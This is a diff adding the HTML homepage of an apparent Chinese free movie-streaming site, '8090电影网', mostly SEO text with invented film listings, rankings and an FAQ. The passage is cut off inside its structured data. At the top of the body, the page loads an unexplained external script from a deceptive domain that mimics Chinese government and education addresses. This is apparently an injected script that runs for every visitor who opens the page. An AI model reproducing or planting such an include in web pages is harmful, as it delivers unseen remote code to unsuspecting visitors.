@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
+<title>8090电影网 - 高清电影电视剧免费在线观看_8090dianyingwang-app</title>
+<meta name="description" content="8090电影网（8090dianyingwang-app）提供最新高清电影、热播电视剧、综艺动漫在线观看与影视资讯推荐，收录8090年代经典怀旧影片，更新快、分类全、找片更省心。" />
+<meta name="keywords" content="8090电影网,8090dianyingwang-app,电影在线观看,电视剧大全,经典老电影,8090后怀旧影视,免费看电影,影视资讯" />
+<meta name="author" content="8090电影网" />
+<meta name="robots" content="index,follow" />
+<meta name="format-detection" content="telephone=no" />
+<link rel="canonical" href="https://8090dianyingwang-app/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="8090电影网" />
+<meta property="og:title" content="8090电影网 - 高清电影电视剧免费在线观看" />
+<meta property="og:description" content="8090电影网：最新电影、热播剧集、综艺动漫一站聚合，8090后怀旧经典随时看。" />
+<meta property="og:url" content="https://8090dianyingwang-app/" />
+<meta name="twitter:card" content="summary" />
+<meta name="theme-color" content="#0b0a12" />
+<style>
+/* ===== 基础重置 ===== */
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+  background:#0b0a12;color:#efeaff;line-height:1.7;font-size:16px;
+  background-image:
+    radial-gradient(900px 500px at 12% -8%,rgba(255,46,99,.20),transparent 60%),
+    radial-gradient(800px 480px at 92% 4%,rgba(33,230,193,.16),transparent 60%);
+  background-attachment:fixed;
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+:root{
+  --bg:#0b0a12; --card:#16141f; --card2:#1d1a2b;
+  --pink:#ff2e63; --cyan:#21e6c1; --gold:#ffd93d;
+  --txt:#efeaff; --sub:#a49dc4; --line:rgba(255,255,255,.09);
+  --r:16px; --wrap:1200px;
+}
+.wrap{max-width:var(--wrap);margin:0 auto;padding:0 18px}
+
+/* ===== 顶部导航 ===== */
+.topbar{position:sticky;top:0;z-index:60;
+  background:rgba(11,10,18,.88);backdrop-filter:blur(12px);
+  border-bottom:1px solid var(--line);}
+.topbar .wrap{display:flex;align-items:center;gap:14px;height:62px}
+.logo{display:flex;align-items:center;gap:10px;flex:0 0 auto}
+.logo-mark{width:38px;height:38px;border-radius:10px;flex:0 0 auto;
+  background:linear-gradient(135deg,var(--pink),#7b2ff7 60%,var(--cyan));
+  display:flex;align-items:center;justify-content:center;
+  font-weight:800;color:#fff;font-size:14px;letter-spacing:-.5px;
+  box-shadow:0 6px 18px rgba(255,46,99,.35)}
+.logo-txt{display:flex;flex-direction:column;line-height:1.15}
+.logo-txt b{font-size:19px;letter-spacing:.5px}
+.logo-txt b em{font-style:normal;color:var(--gold)}
+.logo-txt span{font-size:11px;color:var(--sub);letter-spacing:1px}
+
+.search{flex:1 1 auto;max-width:420px;position:relative}
+.search input{width:100%;height:40px;border-radius:999px;border:1px solid var(--line);
+  background:#121019;color:var(--txt);padding:0 92px 0 16px;font-size:14px;outline:none}
+.search input:focus{border-color:var(--cyan);box-shadow:0 0 0 3px rgba(33,230,193,.15)}
+.search button{position:absolute;right:4px;top:4px;height:32px;padding:0 18px;border:0;border-radius:999px;
+  background:linear-gradient(135deg,var(--pink),#ff6b3d);color:#fff;font-size:13px;cursor:pointer}
+
+.nav-toggle{display:none;flex:0 0 auto;width:42px;height:36px;border:1px solid var(--line);
+  border-radius:10px;background:#121019;color:var(--txt);font-size:16px;cursor:pointer}
+#navswitch{display:none}
+.nav{display:flex;gap:4px;flex:0 0 auto}
+.nav a{padding:8px 12px;border-radius:10px;font-size:14px;color:#cfc9e8;white-space:nowrap}
+.nav a:hover,.nav a:focus{background:rgba(255,255,255,.07);color:#fff}
+
+/* ===== 首屏 ===== */
+.hero{position:relative;overflow:hidden;border-bottom:1px solid var(--line)}
+.hero-film{position:absolute;inset:0;opacity:.5;
+  background-image:
+    repeating-linear-gradient(90deg,rgba(255,255,255,.06) 0 10px,transparent 10px 34px),
+    repeating-linear-gradient(0deg,rgba(255,255,255,.03) 0 1px,transparent 1px 4px);}
+.hero .wrap{position:relative;padding:56px 18px 48px;display:grid;grid-template-columns:1.15fr .85fr;gap:34px;align-items:center}
+.badge-line{display:inline-flex;align-items:center;gap:8px;font-size:12px;color:var(--cyan);
+  border:1px solid rgba(33,230,193,.35);background:rgba(33,230,193,.08);
+  padding:6px 12px;border-radius:999px}
+h1{font-size:42px;line-height:1.25;letter-spacing:1px;margin:16px 0 12px}
+h1 em{font-style:normal;background:linear-gradient(180deg,#fff,#ffb0c4);-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p.lead{color:var(--sub);max-width:620px;font-size:15.5px}
+.hero-url{margin:18px 0 22px;display:inline-flex;align-items:center;gap:10px;flex-wrap:wrap;
+  background:#121019;border:1px dashed rgba(255,217,61,.4);border-radius:12px;padding:10px 14px;font-size:13.5px}
+.hero-url i{font-style:normal;color:var(--gold)}
+.btns{display:flex;gap:12px;flex-wrap:wrap}
+.btn{padding:12px 22px;border-radius:999px;font-size:15px;font-weight:600;display:inline-block}
+.btn-1{background:linear-gradient(135deg,var(--pink),#ff6b3d);color:#fff;box-shadow:0 10px 26px rgba(255,46,99,.32)}
+.btn-2{border:1px solid var(--line);background:rgba(255,255,255,.05);color:#efeaff}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-top:26px}
+.stats div{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:14px;text-align:center}
+.stats b{display:block;font-size:22px;color:var(--gold)}
+.stats span{font-size:12px;color:var(--sub)}
+.hero-card{background:linear-gradient(160deg,#1b1828,#241d33);border:1px solid var(--line);
+  border-radius:22px;padding:20px;box-shadow:0 22px 50px rgba(0,0,0,.45)}
+.hero-card h3{font-size:15px;margin-bottom:12px;display:flex;justify-content:space-between;align-items:center}
+.hero-card h3 small{font-size:11px;color:var(--sub);font-weight:400}
+.mini{display:flex;gap:12px;align-items:center;padding:10px;border-radius:12px;background:rgba(255,255,255,.04);margin-bottom:10px}
+.poster{width:52px;height:70px;border-radius:8px;flex:0 0 auto;display:flex;align-items:flex-end;
+  padding:6px;font-size:10px;color:#fff;font-weight:700;text-shadow:0 1px 3px rgba(0,0,0,.6)}
+.mini-txt b{display:block;font-size:14px}
+.mini-txt span{font-size:12px;color:var(--sub)}
+.score{margin-left:auto;font-size:13px;color:var(--gold);font-weight:700}
+
+/* ===== 通用区块 ===== */
+section{padding:52px 0}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:24px;flex-wrap:wrap}
+.sec-head h2{font-size:26px;position:relative;padding-left:14px}
+.sec-head h2::before{content:"";position:absolute;left:0;top:6px;bottom:6px;width:4px;border-radius:4px;
+  background:linear-gradient(180deg,var(--pink),var(--cyan))}
+.sec-head p{font-size:13px;color:var(--sub);max-width:560px}
+.more{font-size:13px;color:var(--cyan)}
+
+/* 卡片网格 */
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.card{background:var(--card);border:1px solid var(--line);border-radius:var(--r);overflow:hidden;
+  transition:transform .25s,border-color .25s,box-shadow .25s;display:block}
+.card:hover{transform:translateY(-5px);border-color:rgba(255,46,99,.45);box-shadow:0 16px 34px rgba(0,0,0,.45)}
+.thumb{position:relative;aspect-ratio:3/4;display:flex;align-items:flex-end;padding:12px;color:#fff}
+.thumb::after{content:"";position:absolute;inset:0;
+  background:repeating-linear-gradient(90deg,rgba(0,0,0,.16) 0 6px,transparent 6px 18px)}
+.thumb b{position:relative;z-index:2;font-size:15px;line-height:1.35;text-shadow:0 2px 8px rgba(0,0,0,.7)}
+.thumb .tag{position:absolute;left:10px;top:10px;z-index:2;font-size:11px;padding:3px 9px;border-radius:999px;
+  background:rgba(0,0,0,.55);border:1px solid rgba(255,255,255,.18)}
+.thumb .rate{position:absolute;right:10px;top:10px;z-index:2;font-size:12px;font-weight:800;color:var(--gold);
+  background:rgba(0,0,0,.55);padding:3px 8px;border-radius:8px}
+.card .meta{padding:12px}
+.card .meta b{display:block;font-size:14.5px;margin-bottom:4px}
+.card .meta span{font-size:12px;color:var(--sub)}
+
+/* 分类标签 */
+.chips{display:flex;flex-wrap:wrap;gap:10px}
+.chip{padding:9px 16px;border-radius:999px;border:1px solid var(--line);background:var(--card);
+  font-size:13.5px;color:#d8d3ef}
+.chip:hover{border-color:var(--cyan);color:#fff;background:rgba(33,230,193,.1)}
+.chip.feat{background:linear-gradient(135deg,var(--pink),#ff6b3d);border-color:transparent;color:#fff;font-weight:600}
+
+/* 榜单 */
+.rank{display:grid;grid-template-columns:repeat(2,1fr);gap:0 32px}
+.rank li{display:flex;align-items:center;gap:14px;padding:12px 0;border-bottom:1px dashed var(--line)}
+.rank .no{flex:0 0 30px;height:30px;border-radius:9px;display:flex;align-items:center;justify-content:center;
+  font-weight:800;font-size:14px;background:rgba(255,255,255,.06);color:var(--sub)}
+.rank li:nth-child(1) .no,.rank li:nth-child(2) .no,.rank li:nth-child(3) .no{
+  background:linear-gradient(135deg,var(--pink),#ff8a3d);color:#fff}
+.rank .rt{flex:1 1 auto}
+.rank .rt b{display:block;font-size:14.5px}
+.rank .rt span{font-size:12px;color:var(--sub)}
+.rank .hot{font-size:12.5px;color:var(--gold)}
+
+/* 资讯 */
+.news{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.news article{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:18px}
+.news article time{font-size:12px;color:var(--cyan)}
+.news article h3{font-size:16px;margin:8px 0 8px}
+.news article p{font-size:13.5px;color:var(--sub)}
+
+/* SEO 文案 + FAQ */
+.seo{background:linear-gradient(180deg,rgba(255,255,255,.03),transparent);
+  border-top:1px solid var(--line);border-bottom:1px solid var(--line)}
+.seo-txt{display:grid;grid-template-columns:1fr 1fr;gap:26px}
+.seo-txt h3{font-size:18px;margin-bottom:10px}
+.seo-txt p{font-size:14.5px;color:#c9c3e6;margin-bottom:12px}
+.seo-txt strong{color:var(--gold)}
+.faq{margin-top:26px}
+.faq details{background:var(--card);border:1px solid var(--line);border-radius:12px;margin-bottom:10px;padding:0 16px}
+.faq summary{cursor:pointer;padding:14px 0;font-size:14.5px;font-weight:600;list-style:none}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::after{content:"+";float:right;color:var(--cyan);font-weight:700}
+.faq details[open] summary::after{content:"-"}
+.faq p{padding:0 0 14px;font-size:13.5px;color:var(--sub)}
+
+/* 页脚 */
+footer{background:#08070e;border-top:1px solid var(--line);padding:38px 0 26px;font-size:13.5px;color:var(--sub)}
+.fgrid{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:26px}
+.fgrid h4{color:#efeaff;font-size:15px;margin-bottom:12px}
+.fgrid a{display:block;padding:5px 0;color:var(--sub)}
+.fgrid a:hover{color:var(--cyan)}
+.copy{margin-top:26px;padding-top:18px;border-top:1px solid var(--line);
+  display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap;font-size:12.5px}
+
+/* ===== 移动端自适应 ===== */
+@media (max-width:1000px){
+  .grid{grid-template-columns:repeat(3,1fr)}
+  .news{grid-template-columns:repeat(2,1fr)}
+  .hero .wrap{grid-template-columns:1fr;padding-top:40px}
+  h1{font-size:32px}
+  .fgrid{grid-template-columns:1fr 1fr}
+}
+@media (max-width:760px){
+  .nav-toggle{display:block;margin-left:auto}
+  .search{order:3;flex-basis:100%;max-width:none;margin:0 0 12px}
+  .topbar .wrap{height:auto;flex-wrap:wrap;padding-top:12px;padding-bottom:12px}
+  #navswitch:checked ~ .nav{display:flex}
+  .nav{display:none;order:4;flex-basis:100%;flex-wrap:wrap;padding-top:4px}
+  .nav a{flex:1 1 30%;text-align:center;font-size:13.5px}
+  .grid{grid-template-columns:repeat(2,1fr);gap:12px}
+  .news,.seo-txt{grid-template-columns:1fr}
+  .rank{grid-template-columns:1fr}
+  section{padding:38px 0}
+  h1{font-size:27px}
+  .sec-head h2{font-size:22px}
+  .stats{grid-template-columns:repeat(3,1fr);gap:8px}
+  .stats b{font-size:18px}
+  .hero-card{padding:16px}
+  .copy{flex-direction:column}
+}
+@media (max-width:400px){
+  .grid{grid-template-columns:1fr}
+  .logo-txt b{font-size:17px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- ============ 顶部导航 ============ -->
+<header class="topbar">
+  <div class="wrap">
+    <a class="logo" href="#" aria-label="8090电影网首页">
+      <span class="logo-mark" aria-hidden="true">8090</span>
+      <span class="logo-txt">
+        <b>8090<em>电影网</em></b>
+        <span>8090dianyingwang-app</span>
+      </span>
+    </a>
+
+    <form class="search" action="#" method="get" role="search">
+      <label for="kw" style="position:absolute;left:-9999px">搜索影片</label>
+      <input id="kw" name="kw" type="search" placeholder="搜索电影 / 电视剧 / 演员…" autocomplete="off" />
+      <button type="submit">搜片</button>
+    </form>
+
+    <input id="navswitch" type="checkbox" />
+    <label class="nav-toggle" for="navswitch" aria-label="展开导航菜单">☰</label>
+
+    <nav class="nav" aria-label="网站主导航">
+      <a href="#movie">最新电影</a>
+      <a href="#tv">热播剧集</a>
+      <a href="#show">综艺动漫</a>
+      <a href="#rank">热门榜单</a>
+      <a href="#news">影视资讯</a>
+      <a href="#about">关于8090电影网</a>
+    </nav>
+  </div>
+</header>
+
+<!-- ============ 首屏 ============ -->
+<div class="hero">
+  <div class="hero-film" aria-hidden="true"></div>
+  <div class="wrap">
+    <div>
+      <span class="badge-line">◆ 每日更新 · 高清画质 · 免注册直接看</span>
+      <h1><em>8090电影网</em> 高清电影电视剧免费在线观看</h1>
+      <p class="lead">8090电影网（8090dianyingwang-app）专注最新电影、热播电视剧、综艺与动漫资源聚合，同时收录大量 8090 后耳熟能详的经典老片。全站分类清晰、更新及时，找片、追剧一步到位。</p>
+      <div class="hero-url">官方网址：<i>https://8090dianyingwang-app</i>&nbsp;｜&nbsp;收藏本站，精彩不错过</div>
+      <div class="btns">
+        <a class="btn btn-1" href="#movie">立即看片</a>
+        <a class="btn btn-2" href="#rank">查看热门榜单</a>
+      </div>
+      <div class="stats">
+        <div><b>32000+</b><span>收录影片</span></div>
+        <div><b>120+</b><span>分类标签</span></div>
+        <div><b>24h</b><span>每日更新</span></div>
+      </div>
+    </div>
+
+    <aside class="hero-card" aria-label="今日推荐">
+      <h3>今日热播推荐 <small>更新于今日</small></h3>
+      <div class="mini">
+        <span class="poster" style="background:linear-gradient(160deg,#ff2e63,#7b2ff7)">动作</span>
+        <span class="mini-txt"><b>烈火追击</b><span>动作 / 2025 · 高清</span></span>
+        <span class="score">9.1</span>
+      </div>
+      <div class="mini">
+        <span class="poster" style="background:linear-gradient(160deg,#21e6c1,#1b6ca8)">科幻</span>
+        <span class="mini-txt"><b>星际回响</b><span>科幻 / 2025 · 4K</span></span>
+        <span class="score">8.8</span>
+      </div>
+      <div class="mini">
+        <span class="poster" style="background:linear-gradient(160deg,#ffd93d,#ff6b3d)">怀旧</span>
+        <span class="mini-txt"><b>青春录像带</b><span>经典 / 90年代 · 修复版</span></span>
+        <span class="score">9.4</span>
+      </div>
+      <p style="font-size:12.5px;color:var(--sub);margin-top:6px">以上影片均可在 8090电影网 分类页与榜单页找到入口。</p>
+    </aside>
+  </div>
+</div>
+
+<main>
+
+  <!-- ============ 栏目一：最新电影 ============ -->
+  <section id="movie">
+    <div class="wrap">
+      <div class="sec-head">
+        <div>
+          <h2>最新电影 · 8090电影网高清片库</h2>
+          <p>动作、喜剧、爱情、科幻、悬疑、动画全类型覆盖，新片上线即更新，支持按年份与地区筛选。</p>
+        </div>
+        <a class="more" href="#">查看全部电影 →</a>
+      </div>
+
+      <div class="chips" style="margin-bottom:22px">
+        <a class="chip feat" href="#">全部</a>
+        <a class="chip" href="#">动作片</a>
+        <a class="chip" href="#">喜剧片</a>
+        <a class="chip" href="#">爱情片</a>
+        <a class="chip" href="#">科幻片</a>
+        <a class="chip" href="#">悬疑片</a>
+        <a class="chip" href="#">恐怖片</a>
+        <a class="chip" href="#">动画片</a>
+        <a class="chip" href="#">8090经典</a>
+      </div>
+
+      <div class="grid">
+        <a class="card" href="#">
+          <div class="thumb" style="background:linear-gradient(160deg,#ff2e63,#3a0ca3)">
+            <span class="tag">动作</span><span class="rate">9.1</span><b>烈火追击</b>
+          </div>
+          <div class="meta"><b>烈火追击</b><span>2025 · 美国 · 动作 / 犯罪</span></div>
+        </a>
+        <a class="card" href="#">
+          <div class="thumb" style="background:linear-gradient(160deg,#21e6c1,#123c69)">
+            <span class="tag">科幻</span><span class="rate">8.8</span><b>星际回响</b>
+          </div>
+          <div class="meta"><b>星际回响</b><span>2025 · 中国大陆 · 科幻 / 冒险</span></div>
+        </a>
+        <a class="card" href="#">
+          <div class="thumb" style="background:linear-gradient(160deg,#ffd93d,#ff6b3d)">
+            <span class="tag">怀旧</span><span class="rate">9.4</span><b>青春录像带</b>
+          </div>
+          <div class="meta"><b>青春录像带</b><span>1996 · 中国香港 · 剧情 / 经典</span></div>
+        </a>
+        <a class="card" href="#">
+          <div class="thumb" style="background:linear-gradient(160deg,#7b2ff7,#f107a3)">
+            <span class="tag">爱情</span><span class="rate">8.5</span><b>夏天的第七封信</b>
+          </div>
+          <div class="meta"><b>夏天的第七封信</b><span>2024 · 日本 · 爱情 / 青春</span></div>
+        </a>
+        <a class="card" href="#">
+          <div class="thumb" style="background:linear-gradient(160deg,#2b2d42,#8d99ae)">
+            <span class="tag">悬疑</span><span class="rate">8.9</span><b>暗巷回声</b>
+          </div>
+          <div class="meta"><b>暗巷回声</b><span>2025 · 韩国 · 悬疑 / 惊悚</span></div>
+        </a>
+        <a class="card" href="#">
+          <div class="thumb" style="background:linear-gradient(160deg,#06d6a0,#118ab2)">
+            <span class="tag">动画</span><span class="rate">9.0</span><b>山海少年团</b>
+          </div>
+          <div class="meta"><b>山海少年团</b><span>2025 · 中国大陆 · 动画 / 奇幻</span></div>
+        </a>
+        <a class="card" href="#">
+          <div class="thumb" style="background:linear-gradient(160deg,#f72585,#480ca8)">
+            <span class="tag">喜剧</span><span class="rate">8.3</span><b>老板别开玩笑了</b>
+          </div>
+          <div class="meta"><b>老板别开玩笑了</b><span>2024 · 中国大陆 · 喜剧 / 都市</span></div>
+        </a>
+        <a class="card" href="#">
+          <div class="thumb" style="background:linear-gradient(160deg,#ff9e00,#bb3e03)">
+            <span class="tag">8090经典</span><span class="rate">9.6</span><b>江湖旧梦</b>
+          </div>
+          <div class="meta"><b>江湖旧梦</b><span>1992 · 中国香港 · 武侠 / 修复版</span></div>
+        </a>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ 栏目二：热播剧集 ============ -->
+  <section id="tv" style="background:rgba(255,255,255,.02);border-top:1px solid var(--line);border-bottom:1px solid var(--line)">
+    <div class="wrap">
+      <div class="sec-head">
+        <div>
+          <h2>热播剧集 · 电视剧大全同步追更</h2>
+          <p>国产剧、韩剧、美剧、日剧、泰剧分区呈现，更新进度一目了然，8090电影网追剧不迷路。</p>
+        </div>
+        <a class="more" href="#">剧集时间表 →</a>
+      </div>
+      <div class="grid">
+        <a class="card" href="#">
+          <div class="thumb" style="background:linear-gradient(160deg,#5a189a,#ff006e)">
+            <span class="tag">更新至28集</span><span class="rate">8.7</span><b>长街故人</b>
+          </div>
+          <div class="meta"><b>长街故人</b><span>国产剧 · 都市情感 · 32集全</span></div>
+        </a>
+        <a class="card" href="#">
+          <div class="thumb" style="background:linear-gradient(160deg,#1d3557,#457b9d)">
+            <span class="tag">更新至12集</span><span class="rate">9.0</span><b>沉默的证词</b>
+          </div>
+          <div class="meta"><b>沉默的证词</b><span>国产剧 · 刑侦悬疑 · 24集</span></div>
+        </a>
+        <a class="card" href="#">
+          <div class="thumb" style="background:linear-gradient(160deg,#e63946,#1d3557)">
+            <span class="tag">已完结</span><span class="rate">8.9</span><b>汉江恋人</b>
+          </div>
+          <div class="meta"><b>汉江恋人</b><span>韩剧 · 爱情喜剧 · 16集全</span></div>
+        </a>
+        <a class="card" href="#">
+          <div class="thumb" style="background:linear-gradient(160deg,#2a9d8f,#264653)">
+            <span class="tag">更新至S3</span><span class="rate">9.2</span><b>西部往事</b>
+          </div>
+          <div class="meta"><b>西部往事</b><span>美剧 · 剧情 / 西部 · 三季</span></div>
+        </a>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ 栏目三：综艺动漫 ============ -->
+  <section id="show">
+    <div class="wrap">
+      <div class="sec-head">
+        <div>
+          <h2>综艺动漫 · 轻松一刻</h2>
+          <p>热门综艺实时跟播，经典与新番动漫双线更新，8090电影网为不同年龄观众都留了一排座位。</p>
+        </div>
+        <a class="more" href="#">更多综艺动漫 →</a>
+      </div>
+      <div class="news">
+        <article>
+          <div class="thumb" style="aspect-ratio:16/9;background:linear-gradient(135deg,#ff2e63,#ffd93d);margin-bottom:12px">
+            <span class="tag">综艺</span><b>周末大玩家 第6期</b>
+          </div>
+          <h3>周末大玩家 第6期</h3>
+          <p>户外竞技真人秀，本周嘉宾阵容升级，8090电影网同步上线正片与花絮。</p>
+        </article>
+        <article>
+          <div class="thumb" style="aspect-ratio:16/9;background:linear-gradient(135deg,#21e6c1,#4361ee);margin-bottom:12px">
+            <span class="tag">动漫</span><b>星港少年 第二季</b>
+          </div>
+          <h3>星港少年 第二季</h3>
+          <p>国产原创热血动画，每周五更新，支持国语/日语双音轨切换。</p>
+        </article>
+        <article>
+          <div class="thumb" style="aspect-ratio:16/9;background:linear-gradient(135deg,#7b2ff7,#f107a3);margin-bottom:12px">
+            <span class="tag">怀旧</span><b>8090动画回忆录</b>
+          </div>
+          <h3>8090动画回忆录</h3>
+          <p>集结一代人的童年动画名场面，8090电影网怀旧专区限时上线。</p>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ 栏目四：热门榜单 ============ -->
+  <section id="rank" style="background:rgba(255,255,255,.02);border-top:1px solid var(--line);border-bottom:1px solid var(--line)">
+    <div class="wrap">
+      <div class="sec-head">
+        <div>
+          <h2>8090电影网热门榜单 TOP10</h2>
+          <p>榜单依据站内播放热度、收藏量与评分综合排序，每小时刷新一次。</p>
+        </div>
+        <a class="more" href="#">完整榜单 →</a>
+      </div>
+      <ol class="rank">
+        <li><span class="no">1</span><span class="rt"><b>烈火追击</b><span>动作 · 2025</span></span><span class="hot">热度 98.6</span></li>
+        <li><span class="no">2</span><span class="rt"><b>青春录像带</b><span>经典 · 1996</span></span><span class="hot">热度 96.2</span></li>
+        <li><span class="no">3</span><span class="rt"><b>星际回响</b><span>科幻 · 2025</span></span><span class="hot">热度 94.8</span></li>
+        <li><span class="no">4</span><span class="rt"><b>沉默的证词</b><span>悬疑剧 · 更新中</span></span><span class="hot">热度 93.1</span></li>
+        <li><span class="no">5</span><span class="rt"><b>江湖旧梦</b><span>武侠 · 1992</span></span><span class="hot">热度 91.7</span></li>
+        <li><span class="no">6</span><span class="rt"><b>暗巷回声</b><span>悬疑 · 2025</span></span><span class="hot">热度 89.4</span></li>
+        <li><span class="no">7</span><span class="rt"><b>长街故人</b><span>都市情感 · 更新中</span></span><span class="hot">热度 88.0</span></li>
+        <li><span class="no">8</span><span class="rt"><b>汉江恋人</b><span>韩剧 · 已完结</span></span><span class="hot">热度 86.5</span></li>
+        <li><span class="no">9</span><span class="rt"><b>山海少年团</b><span>动画 · 2025</span></span><span class="hot">热度 85.2</span></li>
+        <li><span class="no">10</span><span class="rt"><b>老板别开玩笑了</b><span>喜剧 · 2024</span></span><span class="hot">热度 83.9</span></li>
+      </ol>
+    </div>
+  </section>
+
+  <!-- ============ 栏目五：影视资讯 ============ -->
+  <section id="news">
+    <div class="wrap">
+      <div class="sec-head">
+        <div>
+          <h2>影视资讯 · 8090电影网新片速递</h2>
+          <p>聚焦院线新片定档、剧集开播与经典修复动态，看片之前先看看风向。</p>
+        </div>
+        <a class="more" href="#">资讯中心 →</a>
+      </div>
+      <div class="news">
+        <article>
+          <time datetime="2026-09-28">2026-09-28</time>
+          <h3>国庆档新片定档盘点</h3>
+          <p>多部国产大片集中定档国庆，8090电影网已同步建立专题聚合页，方便一站式查阅。</p>
+        </article>
+        <article>
+          <time datetime="2026-09-25">2026-09-25</time>
+          <h3>经典港片修复版上线</h3>
+          <p>十余部 8090 年代经典武侠与警匪片完成 4K 修复，怀旧专区画质全面升级。</p>
+        </article>
+        <article>
+          <time datetime="2026-09-20">2026-09-20</time>
+          <h3>秋季剧集开播指南</h3>
+          <p>悬疑、都市、古装三线齐发，本文按开播时间整理追更表，附站内直达入口。</p>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ 栏目六：关于我们（SEO 文案 + FAQ） ============ -->
+  <section id="about" class="seo">
+    <div class="wrap">
+      <div class="sec-head">
+        <div>
+          <h2>关于 8090电影网</h2>
+          <p>认识一下这个为 8090 后与所有影迷准备的看片小站。</p>
+        </div>
+        <a class="more" href="#">站点地图 →</a>
+      </div>
+
+      <div class="seo-txt">
+        <div>
+          <h3>8090电影网是什么样的站点</h3>
+          <p><strong>8090电影网</strong>（网址 https://8090dianyingwang-app）是一个面向广大影迷的影视内容聚合站点，收录最新高清<strong>电影</strong>、热播<strong>电视剧</strong>、综艺与动漫，并特别设立 8090 年代经典怀旧专区，让一代人的青春记忆随时可回放。</p>
+          <p>站内按类型、地区、年份、语言多维分类，配合热门榜单与新片速递，帮助用户用最短路径找到想看的内容。</p>
+        </div>
+        <div>
+          <h3>在 8090电影网怎么看片</h3>
+          <p>第一步：在顶部搜索框输入片名、演员或导演；第二步：从搜索结果进入详情页查看简介与清晰度；第三步：选择线路开始播放，遇到卡顿可切换备用线路。</p>
+          <p>全站页面针对手机与平板做了自适应排版，移动端浏览、播放体验与桌面端一致流畅。</p>
+        </div>
+      </div>
+
+      <div class="faq">
+        <details open>
+          <summary>8090电影网需要注册才能观看吗？</summary>
+          <p>不需要。8090电影网主打免注册直接看，打开页面即可检索与播放，收藏功能可用本地浏览器书签替代。</p>
+        </details>
+        <details>
+          <summary>8090电影网的内容更新频率如何？</summary>
+          <p>热门院线影片与剧集基本做到当日或次日更新，经典老片与修复版按专题批次入库，每日均有新增。</p>
+        </details>
+        <details>
+          <summary>想找 8090 年代的老电影应该去哪个栏目？</summary>
+          <p>可在电影栏目中点击"8090经典"分类标签，或从榜单页进入怀旧专区，经典港片、老武侠与童年动画都在其中。</p>
+        </details>
+        <details>
+          <summary>8090电影网支持哪些设备访问？</summary>
+          <p>支持手机、平板与电脑浏览器访问，页面宽度自适应，小屏下导航自动折叠，播放页同样做了移动端适配。</p>
+        </details>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<!-- ============ 页脚 ============ -->
+<footer>
+  <div class="wrap">
+    <div class="fgrid">
+      <div>
+        <h4>8090电影网</h4>
+        <p style="max-width:320px">8090电影网 · 8090dianyingwang-app，收录最新高清电影、热播电视剧、综艺动漫与 8090 经典怀旧影片，每日更新。</p>
+        <p style="margin-top:10px">网址：https://8090dianyingwang-app</p>
+      </div>
+      <div>
+        <h4>影片分类</h4>
+        <a href="#">动作片</a><a href="#">喜剧片</a><a href="#">爱情片</a><a href="#">科幻片</a><a href="#">悬疑片</a>
+      </div>
+      <div>
+        <h4>剧集与榜单</h4>
+        <a href="#">国产剧</a><a href="#">韩剧</a><a href="#">美剧</a><a href="#">热门榜单</a><a href="#">新片速递</a>
+      </div>
+      <div>
+        <h4>站点信息</h4>
+        <a href="#">关于我们</a><a href="#">影视资讯</a><a href="#">怀旧专区</a><a href="#">意见反馈</a><a href="#">免责声明</a>
+      </div>
+    </div>
+    <div class="copy">
+      <span>© <span id="year">2026</span> 8090电影网 8090dianyingwang-app · 版权所有</span>
+      <span>本站内容仅作影视信息展示，版权归原权利人所有</span>
+    </div>
+  </div>
+</footer>
+
+<!-- ============ 结构化数据（利于必应收录与展现） ============ -->
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "WebSite",
+      "@id": "https://8090dianyingwang-app/#website",
+      "url": "https://8090dianyingwang-app/",
+      "name": "8090电影网",
+      "alternateName": "8090dianyingwang-app",
+      "description": "8090电影网提供最新高清电影、热播电视剧、综艺动漫在线观看与影视资讯，收录8090年代经典怀旧影片。",
+      "inLanguage": "zh-CN",
+      "potentialAction": {
+        "@type": "SearchAction",
+        "target": "https://8090dianyingwang-app/?kw={search_term_string}",
+        "query-input": "required name=search_term_string"
+      }
+    },
+    {
+      "@type": "Organization",
+      "@id": "https://8090dianyingwang-app/#organization",
+      "name": "8090电影网",
+      "url": "https://8090dianyingwang-app/",
+      "description": "影视内容聚合与影视资讯站点，覆盖电影、电视剧、综艺、动漫及8090经典怀旧影片。"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {"@type": "ListItem", "position": 1, "name": "8090电影网首页", "item": "https://8090dianyingwang-app/"},
+        {"@type": "ListItem", "position": 2, "name": "最新电影", "item": "https://8090dianyingwang-app/#movie"},
+        {"@type": "ListItem", "position": 3, "name": "热播剧集", "item": "https://8090dianyingwang-app/#tv"},
+        {"@type": "ListItem", "position": 4, "name": "综艺动漫", "item": "https://8090dianyingwang-app/#show"},
+        {"@type": "ListItem", "position": 5, "name": "热门榜单", "item": "https://8090dianyingwang-app/#rank"}
+      ]
+    },
+    {
+      "@type": "ItemList",
+      "name": "8090电影网热门榜单 TOP10",
